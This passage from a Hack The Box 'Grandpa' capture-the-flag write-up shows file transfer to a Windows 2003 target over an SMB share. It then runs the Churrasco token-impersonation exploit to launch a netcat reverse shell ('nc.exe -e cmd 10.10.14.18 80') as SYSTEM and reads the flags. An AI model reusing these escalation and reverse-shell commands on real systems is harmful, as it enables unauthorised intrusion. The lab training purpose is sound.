C:\Documents and Settings\All Users\Desktop>certutil -f -urlcache http://10.10.14.18/churrasco.exe churrasco.exe
certutil -f -urlcache http://10.10.14.18/churrasco.exe churrasco.exe
CertUtil: -URLCache command FAILED: 0x80070057 (WIN32: 87)
CertUtil: The parameter is incorrect.

```
Okay by downloading the file with certutil fails. So let's setup a SMB share to host the file(s).

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ sudo impacket-smbserver share $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Before downloading the files to the system we have to have some permission to write to the system. Let's find out where we can write files to the system.

```bash
C:\Documents and Settings\All Users\Desktop>cd c:\
cd c:\

C:\>cd windows
cd windows

C:\WINDOWS>cd temp
cd temp

C:\WINDOWS\Temp>copy \\10.10.14.18\share\nc.exe nc.exe
copy \\10.10.14.18\share\nc.exe nc.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.18\share\churrasco.exe churrasco.exe
copy \\10.10.14.18\share\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp>

```
Let's check the files.
```bash
C:\WINDOWS\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp

04/20/2023  11:12 PM    <DIR>          .
04/20/2023  11:12 PM    <DIR>          ..
04/20/2023  11:10 PM            31,232 churrasco.exe
04/20/2023  11:00 PM            59,392 nc.exe
02/18/2007  03:00 PM            22,752 UPD55.tmp
12/24/2017  08:19 PM    <DIR>          vmware-SYSTEM
04/20/2023  09:34 PM            25,475 vmware-vmsvc.log
09/16/2021  01:23 PM             6,973 vmware-vmusr.log
04/20/2023  09:34 PM               728 vmware-vmvss.log
               7 File(s)        286,467 bytes
               3 Dir(s)   1,263,308,800 bytes free

C:\WINDOWS\Temp>

```

Now setup a listener on our machine to catch a reverse shell.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ sudo rlwrap nc -lvp 80                                            
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80

```
Now we can execute our payload with the exploit.

```bash
C:\WINDOWS\Temp>.\churrasco.exe -d "c:\windows\temp\nc.exe -e cmd 10.10.14.18 80"
.\churrasco.exe -d "c:\windows\temp\nc.exe -e cmd 10.10.14.18 80"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 672 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

C:\WINDOWS\Temp>

```
Let's go back to our netcat listener.

## Privilege escalation

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ sudo rlwrap nc -lvp 80                                            
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.129.254.80.
Ncat: Connection from 10.129.254.80:1050.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>

```
A connection has been established. Let's find out who we are and if possible capture the flags.

```bash
C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>hostname
hostname
granpa

C:\WINDOWS\TEMP>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .htb
   IP Address. . . . . . . . . . . . : 10.129.254.80
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```
Since we have proven who we are and on what system we can capture both flags on this machine.
```
C:\WINDOWS\TEMP>cd "C:\Documents and settings\"
cd "C:\Documents and settings\"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)   1,263,296,512 bytes free

C:\Documents and Settings>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
HERE IS THE ROOT FLAG
C:\Documents and Settings>type Harry\Desktop\user.txt
type Harry\Desktop\user.txt
HERE IS THE USER FLAG
C:\Documents and Settings>

```
